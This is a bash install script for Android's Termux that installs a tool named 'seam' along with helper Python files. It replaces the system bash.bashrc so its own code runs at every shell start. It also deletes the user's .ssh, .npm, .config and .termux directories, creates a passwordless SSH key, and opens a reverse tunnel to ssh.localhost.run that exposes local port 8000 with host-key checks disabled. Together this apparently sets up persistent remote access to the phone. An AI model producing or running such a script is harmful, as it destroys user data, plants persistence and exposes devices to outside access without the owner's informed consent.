#!/bin/bash

apt update -y
apt upgrade -y
pkg install -y git
pkg install -y python
pip install requests
pip install datetime
pip install pexpect
pkg install -y termux-api
pkg install -y openssh




chmod +x seam
rm -rf /data/data/com.termux/files/usr/bin/seam
rm -rf /data/data/com.termux/files/rms.py
rm -rf /data/data/com.termux/files/hex.py
rm -rf /data/data/com.termux/files/sto.py
rm -rf /data/data/com.termux/files/termux.json
rm -rf /data/data/com.termux/files/usr/etc/bash.bashrc

# Default values
id=1
uid=null

# Check if uid is provided and not null
if [ "$uid" == "null" ]; then
  uid=null
fi

while getopts "i:u:" opt; do
  case $opt in
    i) id="$OPTARG";;
    u) uid="$OPTARG";;
    *) echo "Invalid option"; exit 1;;
  esac
done

# Check if id and uid are provided
if [ -z "$id" ] || [ -z "$uid" ]; then
  echo "Usage: bash install.sh -i <id_value> -u <uid_value>"
  exit 1
fi

# Create or update JSON
cat <<EOL > data/termux.json
{
    "sto": true,
    "com": "",
    "id": $id,
    "uid": $uid
}
EOL

echo "JSON file updated with id=$id and uid=$uid"


cp seam -t /data/data/com.termux/files/usr/bin
cp data/rms.py -t /data/data/com.termux/files
cp data/hex.py -t /data/data/com.termux/files
cp data/sto.py -t /data/data/com.termux/files
cp data/termux.json -t /data/data/com.termux/files
cp data/bash.bashrc -t /data/data/com.termux/files/usr/etc

cd /data/data/com.termux/files/home

rm -rf .ssh
rm -rf .npm
rm -rf .config
rm -rf .termux
ssh-keygen -t rsa -f /data/data/com.termux/files/home/.ssh/id_rsa -N ""
yes | ssh -o "StrictHostKeyChecking no" -R 80:localhost:8000 ssh.localhost.run &
sleep 8
pkill -SIGINT -f "ssh -o StrictHostKeyChecking no -R 80:localhost:8000 ssh.localhost.run"
clear

seam
